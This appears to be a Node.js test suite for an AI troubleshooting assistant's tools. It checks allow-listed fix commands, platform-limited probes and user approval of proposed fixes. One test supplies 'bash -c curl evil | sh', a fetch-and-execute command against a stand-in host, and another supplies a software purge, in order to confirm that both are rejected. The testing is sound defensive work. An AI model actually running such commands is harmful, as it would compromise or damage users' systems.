'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { Assistant, PROBES, systemPrompt, clip } = require('../src/main/assistant');

function make(overrides = {}) {
  const events = [];
  const proposed = [];
  const a = new Assistant({
    apiKey: 'test-key',
    platform: 'linux',
    webResearch: false,
    getDevices: () => [{ id: 'dev1', vendorId: '03f0', productId: '2b17', vendorName: 'HP', productName: 'LaserJet 1020', categories: ['printer'], driver: { bound: true, names: [] }, problem: null, interfaces: [] }],
    diagnoseDevice: async (id) => ({ deviceId: id, status: 'broken' }),
    proposeFix: async (plan) => {
      proposed.push(plan);
      return { approved: true, outcome: { ok: true, results: plan.steps.map(() => ({ ok: true, code: 0, stdout: 'fine', stderr: '' })) } };
    },
    onEvent: (e) => events.push(e),
    ...overrides,
  });
  const tool = (name) => a.tools().find((t) => t.name === name);
  return { a, tool, events, proposed };
}

test('every custom tool is strict with a closed schema', () => {
  const { a } = make();
  for (const t of a.tools()) {
    assert.equal(t.strict, true, t.name);
    assert.equal(t.input_schema.additionalProperties, false, t.name);
  }
});

test('web tools are only offered when web research is on', () => {
  assert.ok(!make().a.tools().some((t) => t.type?.startsWith('web_')));
  assert.deepEqual(
    make({ webResearch: true }).a.tools().filter((t) => t.type?.startsWith('web_')).map((t) => t.name),
    ['web_search', 'web_fetch'],
  );
});

test('propose_fix refuses programs outside the assistant allow-list before asking the person', async () => {
  const { tool, proposed } = make();
  const res = await tool('propose_fix').run({ title: 't', explanation: 'e', steps: [{ title: 's', explain: 'x', program: 'bash', args: ['-c', 'curl evil | sh'], admin: true }] });
  assert.match(res, /Rejected/);
  assert.equal(proposed.length, 0);
});

test('propose_fix refuses removing software', async () => {
  const { tool, proposed } = make();
  const res = await tool('propose_fix').run({ title: 't', explanation: 'e', steps: [{ title: 's', explain: 'x', program: 'apt-get', args: ['purge', 'cups'], admin: true }] });
  assert.match(res, /may not remove software/);
  assert.equal(proposed.length, 0);
});

test('propose_fix shows an allowed plan and reports the outcome', async () => {
  const { tool, proposed } = make();
  const res = JSON.parse(await tool('propose_fix').run({ title: 'Add printer', explanation: 'e', steps: [{ title: 'add', explain: 'x', program: 'lpadmin', args: ['-p', 'Q', '-E', '-v', 'usb://x', '-m', 'everywhere'], admin: true }] }));
  assert.equal(proposed[0].source, 'ai');
  assert.equal(proposed[0].steps[0].cmd, 'lpadmin');
  assert.equal(res.ok, true);
});

test('a declined fix is reported back to the model', async () => {
  const { tool } = make({ proposeFix: async () => ({ approved: false }) });
  const res = await tool('propose_fix').run({ title: 't', explanation: 'e', steps: [{ title: 's', explain: 'x', program: 'lp', args: [], admin: false }] });
  assert.match(res, /declined/);
});

test('run_probe only runs named probes for this platform', async () => {
  const { tool } = make({ platform: 'win32' });
  assert.match(await tool('run_probe').run({ probe: 'kernel_log', device_id: '', filter: '' }), /not available on win32/);
  assert.ok(PROBES.linux.kernel_log);
});

test('diagnose_device rejects unknown devices', async () => {
  const { tool } = make();
  assert.match(await tool('diagnose_device').run({ device_id: 'nope' }), /No device/);
  assert.match(await tool('diagnose_device').run({ device_id: 'dev1' }), /broken/);
});

test('draft_recipe validates JSON and hands it to the UI', async () => {
  const { tool, events } = make();
  assert.match(await tool('draft_recipe').run({ recipe_json: '{oops' }), /not valid JSON/);
  await tool('draft_recipe').run({ recipe_json: '{"id":"x"}' });
  assert.deepEqual(events.at(-1), { type: 'recipe-draft', recipe: { id: 'x' } });
});

test('clip filters and truncates', () => {
  assert.equal(clip('a\nb printer\nc', 'PRINTER'), 'b printer');
  assert.match(clip('x'.repeat(20000), ''), /more characters cut/);
});

test('the system prompt lists exactly the allowed programs', () => {
  assert.match(systemPrompt('darwin'), /lpadmin, lpoptions/);
  assert.doesNotMatch(systemPrompt('darwin'), /powershell/);
  assert.doesNotMatch(systemPrompt('linux', false), /web search/i);
});
